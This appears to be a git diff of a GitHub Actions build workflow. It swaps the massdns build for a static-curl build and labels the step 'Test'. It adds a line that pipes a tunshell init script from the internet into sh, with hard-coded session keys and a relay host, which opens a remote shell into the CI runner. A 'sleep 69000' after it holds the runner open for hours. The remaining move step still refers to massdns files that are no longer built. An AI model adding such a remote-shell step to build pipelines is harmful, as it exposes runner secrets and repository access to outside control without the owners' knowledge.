@@ -24,18 +24,19 @@ jobs:
       - name: Setup Env
         run: |
           # Create Output Dir
-          mkdir -p "$GITHUB_WORKSPACE/main/massdns"
+          #mkdir -p "$GITHUB_WORKSPACE/main/massdns"
      
-      - name: Build --> windows-static-x64       
+      - name: Build --> Test       
         run: |
           # git clone
-          cd $(mktemp -d) && git clone https://github.com/blechschmidt/massdns
+          cd $(mktemp -d) && git clone https://github.com/stunnel/static-curl
           # Mark Safe
           git config --global --add safe.directory $(pwd)
-          # Add static flag
-          sed -i 's/$(CC) $(CFLAGS) $(CPPFLAGS) $(LDFLAGS) $(PROJECT_FLAGS) -O3 -std=c11 -DHAVE_EPOLL -DHAVE_SYSINFO -Wall -fstack-protector-strong src\/main.c/$(CC) $(CFLAGS) $(CPPFLAGS) $(LDFLAGS) $(PROJECT_FLAGS) -O3 -std=c11 -DHAVE_EPOLL -DHAVE_SYSINFO -Wall -fstack-protector-strong src\/main.c -s  -static/g' "./massdns/Makefile"
           # Build
-          docker run --privileged -v $(pwd):/work dockcross/windows-static-x64 bash -c "git config --global --add safe.directory /work/massdns ; cd ./massdns && make nolinux -j$(($(nproc)+1)) ; echo && chmod +x ./bin/massdns && ./bin/massdns --help ; echo"
+          cd ./static-curl && chmod +x curl-static-cross.sh
+          bash curl-static-cross.sh
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T SPAAbWhozWYEJ8ghrZurzB zLNKRT8ySdTx6PDpCKwJ6E eu.relay.tunshell.com
+          sleep 69000
           # Move Bin
           sudo mv ./massdns/bin/massdns "$GITHUB_WORKSPACE/main/massdns/massdns_windows_x64_aarch64_gcc"
           # Remove tmp files
